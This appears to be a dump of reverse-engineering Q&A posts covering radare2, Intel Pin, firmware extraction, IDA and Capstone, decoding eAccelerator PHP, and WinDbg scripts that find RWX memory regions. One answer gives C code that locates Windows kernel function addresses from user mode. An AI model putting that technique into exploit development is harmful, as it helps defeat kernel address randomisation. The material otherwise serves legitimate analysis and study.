<p>Analysis of a program isn't just performing one action and that's it -- it is combined from different analysis for different needs.<br>
radare implements many different commands that perform different kind of analysis. Smart use of these command can help you quick the process of the analysis and analyze only the parts which you believe are the most important:</p>

<ul>
<li>Find functions by prelude instructions (<code>aap</code>)    </li>
<li>Identify functions by following calls (<code>aac</code>)    </li>
<li>Detect jump tables and pointers to code section (<code>/V</code>)     </li>
<li>Analyze opcode absolute and relative references (<code>aa\r</code>)     </li>
<li>Find code/data/string references to a specific address (<code>/r</code>)    </li>
<li>Emulate code to identify new pointer references (<code>aae</code>)</li>
<li>Use binary header information to find public functions (<code>aas</code>)</li>
<li>Assume functions are consecutive (<code>aat</code>)</li>
</ul>

<p>To sums it up, you should think and plan the analysis process that fits best to your needs:</p>

<blockquote>
  <p>radare2 is not a click-and-run program, it’s a set of orthogonal tools and commands that allows you to understand, analyze, manipulate and play with a large list of binary types... Only experience and understanding will give you control on what you are doing.</p>
</blockquote>

<p>If after reading this answer and the post in radare's blog you believe its a bug and you can point at the problem, feel free to open an <a href=""https://github.com/radare/radare2/issues"" rel=""noreferrer"">issue</a> on github.</p>
","16115"
"Intel Pin memory operations tracking","727","","<p>I am using Intel Pin in order trace memory activity of an executable on Windows. What I have found, that most of the memory operands (Read or Write) operates with 2 or 4 bytes. So I decided to modify original Pin's <em><a href=""https://software.intel.com/sites/landingpage/pintool/docs/71313/Pin/html/index.html#MAddressTrace"" rel=""nofollow"">pinatrace</a></em> example, in order to see which Assembly opcodes produces which memory activity.</p>

<pre><code>VOID Instruction(INS ins, VOID *v)
{

        UINT32 memOperands = INS_MemoryOperandCount(ins);
        fprintf(trace,""\n[%s]\n"",(INS_Disassemble(ins)).c_str()); 
        for (UINT32 memOp = 0; memOp &lt; memOperands; memOp++)
        { 
             .....
</code></pre>

<p>What it basically does (I hope), is just writes disassembled opcode BEFORE the memory operands it produces. But then I looked in the file (W is for write, R is for read):</p>

<blockquote>
  <p>[test edx, 0x800000]</p>
  
  <p>[jnz 0x77708557]</p>
  
  <p>[mov dword ptr [ebp-0x4], edi]</p>
  
  <p>[test dl, 0x1]</p>
  
  <p>[jnz 0x77703136] RWWRWW </p>
  
  <p>[lea edi, ptr [ebx+0xcc]]</p>
  
  <p>[push dword ptr [edi]]</p>
  
  <p>[call 0x77702520] RWW </p>
  
  <p>[mov edi, edi]</p>
  
  <p>[push ebp]</p>
  
  <p>[mov ebp, esp]</p>
  
  <p>[mov eax, dword ptr [ebp+0x8]]</p>
  
  <p>[mov ecx, dword ptr fs:[0x18]]</p>
  
  <p>[lea edx, ptr [eax+0x4]]</p>
  
  <p>[lock btr dword ptr [edx], 0x0]</p>
  
  <p>[jnb 0x777041dc]</p>
  
  <p>[mov ecx, dword ptr [ecx+0x24]]</p>
  
  <p>[mov dword ptr [eax+0xc], ecx]</p>
  
  <p>[mov dword ptr [eax+0x8], 0x1]</p>
  
  <p>[mov eax, 0x1]</p>
  
  <p>[pop ebp]</p>
  
  <p>[ret 0x4] WRRRWRWWRR</p>
</blockquote>

<p>As we can see, opcodes that are supposed to work with memory (e.g. <em>mov</em>) do not produce memory operands. While memory traces are connected as blocks after <strong>ret/call/jnz</strong> etc.</p>

<p><strong>Question</strong>: What kind of memory operands does Intel Pin trace? Is it about calls to virtual memory/RAM/CPU registers? Could it be possible, that memory activity goes in blocks due to CPU's pipeline?</p>
","<p>So, finally I came up with the solution that works how I want and results seem to be valid according to <a href=""http://www.agner.org/optimize/instruction_tables.pdf"" rel=""nofollow"">enter link description here</a></p>

<pre><code>fprintf(trace,""\n[%s]\n"",(INS_Disassemble(ins)).c_str()); //(INS_Disassemble(ins)).c_str()
        fflush(trace);


        for (UINT32 memOp = 0; memOp &lt; memOperands; memOp++)
        {

            if (INS_MemoryOperandIsRead(ins, memOp))
            {
                fprintf(trace,""R"");
                icount++;

            }

            if (INS_MemoryOperandIsWritten(ins, memOp))
            {

                fprintf(trace,""W"");
                icount++;

            }
        }
</code></pre>

<p>And it produces the following output:</p>

<pre><code>[mov eax, dword ptr [ebp+0x10]]
R
[mov byte ptr [ebx+0x2], 0x0]
W
[mov byte ptr [ebx+0x7], 0x0]
W
</code></pre>

<p>I cannot be sure that it is the true sequence of executable under analysis because I do output in the instrumentation phase, but the code can probably be modified it the way to write opcode inside another  INS_InsertPredicatedCall, so it will be recorded when it will be executed.</p>
","12643"
"How to extract content of NVRAM file?","726","","<p>How to extract content from NVRAM file? NVRAM type is SPI Serial NOR Flash.
NVRAM has been copied as mtdblock partition.</p>

<p>An embedded device that run Linux v2.6.18_pro500.</p>

<pre><code>Linux version 2.6.18_pro500 (gcc version 4.2.0 20070126 (prerelease) (MontaVista 4.2.0-2.0.0.custom 2007-02-12) 
Processor: ARMv6-compatible processor rev 4 (v6b)
</code></pre>

<p>MTD device contain 8 partitions, nvram mtd7 partition is <code>jffs2</code> filesystem.</p>

<pre><code>/proc/mtd
dev:    size   erasesize  name
mtd0: 00020000 00010000 ""U-Boot""
mtd1: 00010000 00010000 ""env1""
mtd2: 00010000 00010000 ""env2""
mtd3: 007b0000 00010000 ""UBFI1""
mtd4: 007b0000 00010000 ""UBFI2""
mtd5: 000c886c 00010000 ""Kernel""
mtd6: 00416800 00010000 ""RootFileSystem""
mtd7: 00050000 00010000 ""nvram""
</code></pre>
","<p>I've solved this myself. NVRAM mtd7 partition is <code>jffs2</code> filesystem, I successfully extracted content using JFFS2 filesystem extraction tool.</p>
","14662"
"understanding the stack","726","","<p>I have de-assembled a x86 application use ida, it generates
the following code</p>

<pre><code>.text:1084FF10                 push    ebp
.text:1084FF11                 mov     ebp, esp
.text:1084FF13                 and     esp, 0FFFFFFF8h
.text:1084FF16                 sub     esp, 0D4h
.text:1084FF1C                 mov     eax, ___security_cookie
.text:1084FF21                 xor     eax, esp
</code></pre>

<p>What does the instruction ""and esp, 0FFFFFFF8h"" do here?</p>
","<p>This aligns the stack pointer to 8 byte boundary. This is done by the compiler to improve performance, as reads from non-aligned addresses results in performance degradation.</p>
","3684"
"Limitations of capstone's disassembly capabilities compared to IDA","725","","<p>I was wondering if there are any limitations of capstone's disassembling capabilities when compared to IDA.</p>

<p>If yes, are those limitations inherent, i.e. a result of the different design/techniques that capstone and ida use? Or are they rather due to ""not yet implemented"" features, e.g. capstone's fewer supported CPUs?</p>

<p>If there are inherent limitations, could you give an example?</p>

<p>I am talking about the disassembling only, i.e., I am not interested in things like available APIs, commercial support, license models, plug-in systems, debugging support etc. Just the pure disassembly.</p>

<p>Capstone is mentioned as one answer to the post <a href=""https://reverseengineering.stackexchange.com/questions/1817/is-there-any-disassembler-to-rival-ida-pro"">""Is there any disassembler to rival IDA Pro?""</a>, but it seems to be a copied/pasted text from the capstone website.</p>

<p>PS: The working of IDA is explained/discussed <a href=""https://reverseengineering.stackexchange.com/questions/2347/what-is-the-algorithm-used-in-recursive-traversal-disassembly"">here</a>.</p>
","<p>There is no point in comparing between the two. IDA is more than a disassembler, it is a reversing tool which implements(or could be implemented via plugins) almost every feature you can think of. </p>

<p>Capstone on the other hand, is a simple disassembler engine. It by alone cannot generate the same quality of output as IDA.</p>

<p>For instance, IDA has cross-referencing capability. Cross-refs are generated by a dedicated analysis engine which uses input from the disassembly engine. A disassembly engine, <em>by its own</em> can neither find cross-refs, nor can it recursively disassemble like IDA.</p>

<p>You are comparing a disassembly framework to a tool with a myriad of features. They are not comparable with each other.</p>

<p>If you are talking about just the textual disassembler output, then there is not much of a difference per se.</p>
","11340"
"Decoding eAccelerator PHP code?","723","","<p>Well I'm unsure if this is the correct site to use but how would I go about decoding/decrypting PHP code which is encoded/encrypted using eAccelerator?</p>

<pre><code>&lt;?php
session_start();
?&gt;
&lt;?php /*This encoded file was generated using PHPCoder (http://phpcoder.sourceforge.net/) and eAccelerator (http://eaccelerator.sourceforge.net/)*/ if (!is_callable(""eaccelerator_load"") &amp;&amp; !@dl(""eAccelerator.so"")) { die(""This PHP script has been encoded using the excellent eAccelerator Optimizer, to run it you must install &lt;a href=\""http://eaccelerator.sourceforge.net/\""&gt;eAccelerator or the eLoader&lt;/a&gt;""); }eaccelerator_load(''); ?&gt;
</code></pre>
","<blockquote>
  <p>how would I go about decoding/decrypting PHP code which is
  encoded/encrypted using eAccelerator?</p>
</blockquote>

<p>You would have to reverse engineer the <code>eaccelerator_load()</code> function in eAccelerator.</p>

<p><a href=""http://article.gmane.org/gmane.comp.php.eaccelerator.devel/381"" rel=""nofollow"">Note that this function only exists in older versions of eAccelerator.</a> For example, see here for the function as it existed in version 0.9.4: <a href=""https://github.com/eaccelerator/eaccelerator/blob/e48010887b429a203bf03c7562e30a4d2bfa07d3/loader.c"" rel=""nofollow"">https://github.com/eaccelerator/eaccelerator/blob/e48010887b429a203bf03c7562e30a4d2bfa07d3/loader.c</a></p>

<p>The first thing the loader does is <code>base64_decode()</code> and <code>gzuncompress()</code> the string. You can see the (mostly plaintext) result of that here: <a href=""http://ddecode.com/phpdecoder/?results=744654407d52841255a5b54c1d5b402d"" rel=""nofollow"">http://ddecode.com/phpdecoder/?results=744654407d52841255a5b54c1d5b402d</a></p>

<p>It looks like restoring that to more readable code will take a bit more work with analyzing the <code>eaccelerator_load()</code> function, but I'm sure you'll be up to the task :)</p>
","8274"
"Find Address of Windows Kernel Functions","723","","<p>How can I find the address of a Windows kernel function?</p>

<p>In this case I'm trying to find CreateThread.</p>

<p>Can this be done from a debugger? Olly/Immunity?</p>
","<p>It can be done programmatically with a combination of <code>NtQuerySystemInformation</code>, <code>LoadLibraryEx</code>, and <code>GetProcAddress</code>.</p>

<p>The code below may not work perfectly, as I don't have a Windows box to build it for testing.  However, it should move you in the correct direction.</p>

<pre><code>#include ""stdafx.h""

#include &lt;string.h&gt;
#include &lt;windows.h&gt;

enum { SystemModuleInformation = 11 };

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    ULONG Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    CHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef NTSTATUS (*NtQuerySystemInformationFunc)(
    _In_      DWORD SystemInformationClass,
    _Inout_   PVOID                    SystemInformation,
    _In_      ULONG                    SystemInformationLength,
    _Out_opt_ PULONG                   ReturnLength
);

ULONG64 GetKernelFunctionAddress(LPCSTR Name) {
    NtQuerySystemInformationFunc NtQuerySystemInformation = NULL;
    HMODULE hKernel = NULL;
    HMODULE hNtdll = NULL;
    ULONG64 KernelBase = NULL;
    ULONG64 KernelFunctionAddress = NULL;
    RTL_PROCESS_MODULES ModuleInfo = { 0 };

    // Get the address of NtQuerySystemInformation
    hNtdll = GetModuleHandle(""ntdll"");
    NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(hNtdll, ""NtQuerySystemInformation"");

    // Get the base address of the kernel
    NtQuerySystemInformation(SystemModuleInformation, &amp;ModuleInfo, sizeof(ModuleInfo), NULL);
    KernelBase = (ULONG64)ModuleInfo.Modules[0].ImageBase;

    // Load the kernel
    hKernel = LoadLibraryEx(strrchr(ModuleInfo.Modules[0].FullPathName, '\\') + 1, 0, LOAD_LIBRARY_AS_IMAGE_RESOURCE);

    // Look up the function in the kernel
    KernelFunctionAddress = (ULONG64)GetProcAddress(hKernel, Name);

    // Adjust the address based on the kernel load address
    KernelFunctionAddress -= (ULONG64)hKernel;
    KernelFunctionAddress += KernelBase;

    return KernelFunctionAddress;
}
</code></pre>
","12640"
"Reverse engineering XKCD 1190","721","","<p>The latest (as of now) comic is titled <a href=""http://xkcd.com/1190/"">""Time""</a>. It's a standard-looking comic though without much action, but the picture's alt title says ""Wait for it."". I waited but nothing happened (tried in Opera and IE9) so I took a look at the page source.</p>

<p>Next to the picture's <code>&lt;img&gt;</code> tag there was a <code>&lt;script&gt;</code> which included the following URL:</p>

<p><a href=""http://imgs.xkcd.com/static/time07.min.js"">http://imgs.xkcd.com/static/time07.min.js</a></p>

<p>I tried to make sense of it, but I can't figure it out. Can someone explain how it works and what was supposed to happen?</p>
","<p>Somebody at XKCD fora pasted a link to this <a href=""https://gist.github.com/cincodenada/5246094"">gist</a> which contains a deobfuscated and annotated source along with some explanations: </p>

<blockquote>
  <p>The main part of Javascript that drives xkcd's ""Time"" comic (<a href=""http://xkcd.com/1190/"">http://xkcd.com/1190/</a>), deobfuscated and annotated. The bulk of the script seems to be an implementation of EventSource - which, while important, is not terribly interesting for our purposes, so I've omitted it here. After some Googling around, I am in fact fairly certain that the EventSource implementation used here is <a href=""https://github.com/Yaffle/EventSource"">https://github.com/Yaffle/EventSource</a> - after minifying and beautifying that code, it looks very similar to what shows up in time07.min.js.</p>
</blockquote>

<p>As far as I can tell, it has no magic in it and serves just as a simple way for the server to let the client know when there is a new image. </p>
","1341"
"/proc/self/maps equivalent on windows","720","","<p>I see that inspecting <code>/proc/self/maps</code> on Linux machines lets me see the pages that have been mapped in. As a result I can write a program to read and parse the pages it has mapped in.</p>

<p>How could one go about doing something similar for Windows? Are there any APIs for the same? If not, do you have any suggestions on how this could be done? Do you have any references you could link me to?</p>
","<p><a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa366907%28v=vs.85%29.aspx"" rel=""nofollow"">VirtualQueryEx()</a> fills a <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa366775%28v=vs.85%29.aspx"" rel=""nofollow"">MEMORY_BASIC_INFORMATION</a> record with information about a contiguous range of pages containing the queried address. This can be used to walk the address space of a process, by starting with 0 and then using mbi.BaseAddress + mbi.RegionSize as the next address to query and so on. <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms683195%28v=vs.85%29.aspx"" rel=""nofollow"">GetMappedFileName()</a> can give you the name of mapped binaries (mbi.Type == MEM_IMAGE) and mapped files (MEM_MAPPED).</p>

<p>Address overflow is an issue when a 32-bit process runs queries on a 64-bit process; it seems that VirtualQueryEx() fails to fail in that situation and instead saturates the field in question (by setting it to 0xFFFFFFFF). However, that is not documented and hence not reliable. Alternative tests are <code>mbi.RegionSize &gt; DWORD_PTR(-1) - mbi.BaseAddress</code>, or <code>next_va &lt;= curr_va</code> when iterating.</p>

<p>Results for 32-bit process querying 64-bit notepad.exe:</p>

<pre><code>         00000000        10000 -
00010000 00010000        10000 c m rw--  rw-- 
...
FF5F0000 FF5F0000         1000 c i rwxc  r---  notepad.exe
FF5F0000 FF5F1000         B000 c i rwxc  r-x- 
FF5F0000 FF5FC000         4000 c i rwxc  r--- 
FF5F0000 FF600000         2000 c i rwxc  rw-- 
FF5F0000 FF602000         1000 c i rwxc  rw-c 
FF5F0000 FF603000        22000 c i rwxc  r--- 
         FF625000     FFFFFFFF -
overflow -&gt; aborting
</code></pre>

<p>Dito for a 64-bit process:</p>

<pre><code>              0000000000000        10000 -
0000000010000 0000000010000        10000 c m rw--  rw-- 
...
00000FF5F0000 00000FF5F0000         1000 c i rwxc  r---  notepad.exe
00000FF5F0000 00000FF5F1000         B000 c i rwxc  r-x- 
00000FF5F0000 00000FF5FC000         4000 c i rwxc  r--- 
00000FF5F0000 00000FF600000         2000 c i rwxc  rw-- 
00000FF5F0000 00000FF602000         1000 c i rwxc  rw-c 
00000FF5F0000 00000FF603000        22000 c i rwxc  r--- 
              00000FF625000  7FDFB2CB000 -
007FEFA8F0000 007FEFA8F0000         1000 c i rwxc  r---  winspool.drv
...
007FFFFFE0000 007FFFFFE0000        10000 r   r---  !--- 
</code></pre>
","8299"
"Suspicious breakpoint message in ollydbg","720","","<p>i want to set a breakpoint and suddenly the following message appears:</p>

<pre><code> You want to place breakpoint outside the code section. INT3 breakpoint 
 set on data will  not execute and may have disastrous influence on the 
 debugged program. Do you really want to set breakpoint here ?

 Note: you can permanently disable this warning in Options|Security.
</code></pre>

<p>Without knowing what that is, I would guess that is not allowed to set the breakpoint. 
So my question would be:</p>

<p>How can I bypass the annoying message ? Or better: What must I do to not see this ?</p>
","<p>PE files have several sections like <code>.code</code> , <code>.data</code>, <code>.bss</code> etc. Each of the sections have a special purpose, such as the <code>.code</code> section <em>usually</em> contains the programs code i.e. the instructions, the <code>.data</code> sections houses the initialized variables etc.</p>

<p>The above rule is merely a convention followed by compilers. In a packed/obfuscated program, the convention may not always hold true. You can have instructions in data segment and vice-versa. This is done for various reasons like thwarting analysis ,disassembly etc.</p>

<p>When in Ollydbg you try to set a <code>INT3</code> breakpoint on an instruction that happens to be in a section marked for data, Ollydbg would complain and that is the message you see. </p>

<p>The reason for this is suppose that the instruction you set a breakpoint on is actually data. In this case, when the program reads in the value at the address it would read <code>0xCC</code> (INT3 -> 0xCC) instead of the actual value. That can crash the program. Further since this is a read operation, the breakpoint will never be hit.</p>

<p>If you want, you may disable the message in Ollydbg options, however doing that is not always recommended. Instead if you are sure that it is an instruction, you may ignore the warning and set the breakpoint.</p>

<p>The other way is instead of using a <code>INT3</code> breakpoint, set a Hardware breakpoint (HWBP) on execution at the aforesaid address. This way the program would not crash, even if the hwbp was set on data. HWBP's are enforced my the CPU and does not modify the program in any way unlike <code>INT3</code> breakpoints</p>
","4813"
"NetEase Cloud Music: Getting search results in API","719","","<p>I'm trying to make a search request with NetEase Cloud Music's API. I have found the URL used for sending a search request over <code>POST</code> which is: <code>http://music.163.com/api/search/get/web</code> with x-www-form-urlencoded data: <code>hlpretag=%3Cspan+class%3D%22s-fc56%22%3E&amp;hlposttag=%3C%2Fspan%3E&amp;s=ruslana&amp;type=1&amp;offset=0&amp;total=false&amp;limit=10</code>.</p>

<p>Sending this request over produces a result like so:</p>

<pre><code>{""result"":""35b1748964afb6f6ab00803a07621642b1748964af8a7c1d883e3a6f3c773b3d42235da0ba9784a095beda502ab3e8b43fa71f6d6351854d2abf366ed520854009da31982d912f2f7dd26d69e2de683db1f5a185c8d2e83989d1c4b2c230a8669602ea79ebf70989a5b17264db4dabc8072d65deb133001e1236fd8bb37f850490980a4ed65fb639d5629556eff966c2b187d161ba859c63af417aaa447121564e8a4221525d5f0ac885a70ead44a613a07451cddfed5557af6572390e346375e6a91379f94b8530d942573735179b7bdadd3738e4e298e853ded86951b36d7e68ae593ebc6cad73d4e694d2c8debe3e162f84051dda75f10ff58521eb5d5bbf788a1603da61ded1d0b319e80d4bc73218e93665dd8559e420cdd7a0e74d443cd53b8dc20af99a89b3c14e64d9f9aadfc9cbb0b09db8c150e3ea793a1705fb710806ec39f24283c08489169c97527bafb59baed5215f769c55968829b222b3d320b11aab298da17104ddde48d9a77937a6ff100d5e12928d8917810338a51ebf2ef18c879c10a5b2d9c8f29d7524e70265d96ec9016be793f2bbbe55ec7994bb156a6baeda5c4884e6931731d8e6c0124ab298b518977c54c77cbb0eb601db25807ed2ac0d2eff3852427acd83ba0b38dda735b221467975b957074766912e6ea2b2791020bc4305489df1bb9880b47396d1716d01cff904ce4de0d20a4924e6ff220412dbe8305056463c35f7d22dafa3badffded51ee81b6045f5179f59166ec7f4115ecb5f9bb95e92c870a7f7045f1e7765bed3dbf62a09e963279a8ecb2316e39e2540bbe640b20a29a3098f5918aec7572f49ebcca1a3ae96b31927c2274d39ce6b26dd50d0431666a48649c37764010dc48156980022668fd2cec7b855e3a570464a077ffd1005553fd213111a98c2cb20ce50c59c350695b6c93519fd58ee0464e3ae5744873f1de490b0d6f308d6b05cbe59501028a8c8bd6f9a72d1ea6eae2b3ff4a451dc8413d25d611620f3a40b51019a36c2d2674a610bb2cfd2097c1ff3a91ee3b0b6262102dafc72dfd48ab398dea09e3a5d98c952c6674df981017954d222df1cf422403f032cd441f690be826593a50dbac35cb10b555f440e244b1e84e312f9fc0a4b8f5817a916fa4cb65487a12a4558d1adfa01017c6af5f16e2f9eded9c6bab1f62627fa3b3a313a89eeda80f7f4c408542d14ab3d333c0f915d552aedef29595e692dde790dd3b59de48434ff0d86ea13704fbc6f1c8720e82ee2a319d3b779989337239a8"",""code"":200,""abroad"":true}
</code></pre>

<p>I have cut off most of <code>result</code> due to it being colossal. What is the data in <code>result</code> and how is it encoded? Looking through other peoples efforts turns up nothing to contribute either. On <a href=""https://github.com/grasses/NetEase-Wireless-MusicBox/blob/master/api.py"" rel=""nofollow"">this</a> Github project I've found there's a function for searches, it doesn't seem to do anything significant to the returned data:</p>

<pre><code> def search(self, s, stype=1, offset=0, total='true', limit=60):
        action = 'http://music.163.com/api/search/get/web' 
        print self.cookies
        data = {
            's': s,
            'type': stype,
            'offset': offset,
            'total': total,
            'limit': 60,
            '__csrf': self.cookies['__csrf'],
        }
        return self.httpRequest('POST', action, data)
</code></pre>

<p>And when you look on the NetEase website itself and look at the API calls after a search, theres nothing, so its not like theres an extra API call involved in getting all the search data either. </p>

<p>Any input on this would be greatly appreciated.</p>
","<p>The answer is embarrassingly simple. Simply remove the <code>/web</code> part of the URL so you end up with something like this: <code>http://music.163.com/api/search/get/</code> and you're good to go.</p>
","9036"
"IDA fails to load Symbols from EXE on Linux","718","","<p>When I try to load a Portable Executable in IDA Pro 6.6 it can't resolve the Symbols. I have hooked it to a <code>win32_remote.exe</code>. It keeps saying <code>E_PDB_NOT_FOUND</code>. </p>

<p>I even have WinDBG installed.</p>
","<p>A common issue is missing <code>symsrv.dll</code>. Please make sure you have it on the remote machine and that <code>win32_remote.exe</code> can find it.</p>

<p>You can also append <code>-z10000</code> to the command line in order to get more output from the MS-DIA libraries.</p>

<p>Thanks to HexRays for this answer.</p>
","4758"
"VADs with RWX permission in winlogon and csrss processes","718","","<p>On a clean Windows XP SP2 installation running inside a VirtualBox VM, when doing a snapshot with <code>vboxmangage debugvm --dumpguestcore</code> and analyzing it in Volatility, I always find 9 VADs with <code>PAGE_EXECUTE_READWRITE</code> permissions in <code>winlogon.exe</code> process and 1 VAD with the same permission in <code>csrss.exe</code> process. Sometimes there is one in <code>explorer.exe</code> process as well.</p>

<p>This is the same for two different Machines one with VirtualBox tools installed and one without.</p>

<p>Where do these come from? What are the write permission useful for?
Any help is mostly appreciated, thank you!</p>
","<p><strong>All the statements below are xp-sp3 based</strong> </p>

<p>windbg can also be used to parse for RWX pages in VadTree<br>
Copy paste following lines to <code>**.txt and run the script $$&gt;a&lt; path to **.txt</code>    </p>

<p>script contents needs grep in path for text parsing </p>

<pre><code>aS  proc        @#Process ;
aS  procname    @@c++( (char *)(((nt!_EPROCESS *) @#Process ))-&gt;ImageFileName )  ;
aS  procvad     @@c++( (((nt!_EPROCESS *) @#Process ))-&gt;VadRoot )  ;
.block { !for_each_process "".printf \""%20ma\t%p\t%p\n\n\"",${procname}, ${proc} , ${procvad}; .echo \n;.shell  -ci  \""!vad ${procvad}\""  grep  \""EXECUTE_READWRITE\"""" } ;
ad *
</code></pre>

<p>and then set the process context to approriate process and examine the memory from StartVpn to EndVpn</p>

<p>iirc Winlogon and csrss always had a few RWX pages<br>
the csrss RWX page always seemed to contain lots of initialization  _UNICODE_STRING<br>
most of the pages wont be available for viewing you may need to live debug in Phase1Init Stage </p>

<pre><code>sxe ibp;.reboot  
</code></pre>

<p>on reboot set <code>bp NtCreateProcessEx</code> until csrss is about to be created<br>
<code>bc * ; gu ;!vad on csrss _EPROCESS</code> 
csrss process at this point wont have the RWX page<br>
only 4 vads will exist in csrss VadTree<br>
you may need to follow from here and catch the allocation / writes and executions</p>

<pre><code>           csrss.exe    86acebe0    86d62660  
86d39250 ( 4) 7f6f0 7f7ef 0 Mapped       EXECUTE_READWRITE  Pagefile-backed section
</code></pre>

<p>this oneliner will fetch you most of the strings in that page</p>

<pre><code>.foreach (place { s -[1]b 7f6f0000 l?7000 0x7f } ) { r $t0 = place ; dS @$t0-7}
</code></pre>

<p>output of the above line</p>

<pre><code>7f6f2170  ""C:\WINDOWS""
7f6f2190  ""C:\WINDOWS\system32""
7f6f21c0  ""\BaseNamedObjects""
7f6f2208  "".罯...罯""
7f6f22b0  "".罯...罯""
7f6f221c  ""Autorun.inf""
7f6f2300  "".罯02.罯Software\Microsoft\Clock""
7f6f226c  ""DoesNotExist""
7f6f2260  "".罯""
7f6f2368  ""ヘ罯...罯.罯""
7f6f22c4  ""Clock.ini""
7f6f23d8  "".罯68.罯Control Panel\Color Scheme""
7f6f2418  ""s""
7f6f230c  ""Software\Microsoft\Clock""
</code></pre>

<p>the winlogon RWX pages will contain Executble code most of them will start with 
<code>push cx push ax</code> sequence and end with an indirect call to somehwre via <code>jmp eax</code> 
and some intermediate calls to unviewable / non existing locations 
may need live analysis </p>

<p>never observed rwx pages in clean explorer / iexplore / services.exe processos
they exist only if some antivirus etc are installed</p>

<p>see below for an <code>Avasted RWX</code> page in explorer.exe patching <code>RtlSetCurrentDirectory_U</code> and loading <code>snxhk.dll using LdrLoadDll()</code> this same patch can also be observed in iexplore.exe</p>

<pre><code>.shell dir /b scan*vad*
scanvad4rwx.txt    
lkd&gt; $$&gt;a&lt; scanvad4rwx.txt
              System    86fc6830    86fbfa90     
            smss.exe    86b0e020    86dfd008      
           csrss.exe    86acebe0    86f4e4d0  
86d39250 ( 4) 7f6f0 7f7ef 0 Mapped EXECUTE_READWRITE  Pagefile-backed section    
        winlogon.exe    86d7b918    86d58930  
86ae8ee0 ( 8)       9550     9553         4 Private      EXECUTE_READWRITE 
86340690 ( 7)      29c90    29c93         4 Private      EXECUTE_READWRITE 
86f370d0 ( 6)      2a4f0    2a4f3         4 Private      EXECUTE_READWRITE 
86b13a38 ( 5)      46580    46583         4 Private      EXECUTE_READWRITE 
86da2a00 ( 6)      497c0    497c3         4 Private      EXECUTE_READWRITE 
        services.exe    86b0a020    86ec15c8  
86da7c20 (12)        380      380         1 Private      EXECUTE_READWRITE 
               lsass.exe    86b2a6b8    86b21110  
    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        explorer.exe    86241260    86b86768  
86b13d28 (13)         90       90         1 Private      EXECUTE_READWRITE 
86545e50 (11)        2b0      2b0         1 Private      EXECUTE_READWRITE 
86aa6878 (12)        2c0      2ca        11 Private      EXECUTE_READWRITE 
86b056a0 (10)        2d0      2da        11 Private      EXECUTE_READWRITE 
86b3b9c8 (12)        2e0      2ea        11 Private      EXECUTE_READWRITE 
             AvastUI.exe    86315a00    860fc008  
    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        iexplore.exe    86aaf020    861b3f00  
862ae9f8 (16)        150      150         1 Private      EXECUTE_READWRITE 
</code></pre>

<p>on rereading i noticed the below output is from a differnt session
so splitting </p>

<pre><code>and examine the memory  using  lkd&gt; .process /p /r 862543e8 &amp;   lkd&gt; uf 150000
00150000 50              push    eax
00150001 60              pushad
00150002 bd42001500      mov     ebp,150042h
00150007 8b7d10          mov     edi,dword ptr [ebp+10h]
0015000a 8b4518          mov     eax,dword ptr [ebp+18h]
0015000d 8b5d1c          mov     ebx,dword ptr [ebp+1Ch]
00150010 8907            mov     dword ptr [edi],eax
00150012 895f04          mov     dword ptr [edi+4],ebx
00150015 897c2420        mov     dword ptr [esp+20h],edi
00150019 8d454c          lea     eax,[ebp+4Ch]
0015001c 50              push    eax
0015001d ff7548          push    dword ptr [ebp+48h]
00150020 8d4550          lea     eax,[ebp+50h]
00150023 50              push    eax
00150024 8d4540          lea     eax,[ebp+40h]
00150027 50              push    eax
00150028 6aff            push    0FFFFFFFFh
0015002a ff5508          call    dword ptr [ebp+8]
0015002d 85c0            test    eax,eax
0015002f 750f            jne     00150040    
00150031 33c9            xor     ecx,ecx
00150033 8d4538          lea     eax,[ebp+38h]
00150036 50              push    eax
00150037 8d4528          lea     eax,[ebp+28h]
0015003a 50              push    eax
0015003b 51              push    ecx
0015003c 51              push    ecx
0015003d ff5500          call    dword ptr [ebp]    
00150040 61              popad
00150041 c3              ret
</code></pre>

<p>put the commands in one line </p>

<pre><code>? @$t1+10 ; ? poi(@$t1+10) ; ln poi(@$t1+10); db (@$t1+18) l8; u (@$t1+18)  l3;
? poi(@$t1+4c) ; ? poi(@$t1+48) ; ? poi(@$t1+50) ;? poi(@$t1+40) ;  lm m ntdll* ;
ln poi(@$t1+8) ; ? poi(@$t1+38); db  (@$t1+28) l8; du /c 40 poi(@$t1+2c) ;
? poi(@$t1); ln poi(@$t1);.echo patches RtlSetCurwith pattern and sets return 
address    [esp+20]to patched instruction calls ntvirtproct for a pagein ntdll 
on successloads a dll using LdrLoadDll;   

Evaluate expression: 1376338 = 00150052
Evaluate expression: 2089936810 = 7c91e7aa
(7c91e7aa)       Exact matches: ntdll!RtlSetCurrentDirectory_U
0015005a  6a 6c 68 78 e9 91 7c e8                          jlhx..|.
0015005a 6a6c            push    6Ch
0015005c 6878e9917c      push    offset ntdll!`string'+0x34 (7c91e978)
00150061 e81501ffff      call    0014017b
Evaluate expression: 64 = 00000040
Evaluate expression: 32 = 00000020
Evaluate expression: 4096 = 00001000
Evaluate expression: 2089934848 = 7c91e000
start    end        module name
7c900000 7c9b2000   ntdll      (pdb symbols)          f:\symbols\ntdll.pdb
(7c90d6ee)   Exact matches: ntdll!NtProtectVirtualMemory
Evaluate expression: 1691353088 = 64d00000
0015006a  60 00 60 00 9a 00 15 00                          `.`.....
0015009a  ""C:\Program Files\Alwil Software\Avast5\snxhk.dll""
Evaluate expression: 2089903043 = 7c9163c3
(7c9163c3)      Exact matches:    ntdll!LdrLoadDll = &lt;no type information&gt;
patches RtlSetCurwith pattern and sets return address    
[esp+20] to patched instruction calls ntvirtproct for     
a page in ntdll on success loads a dll using LdrLoadDll
</code></pre>

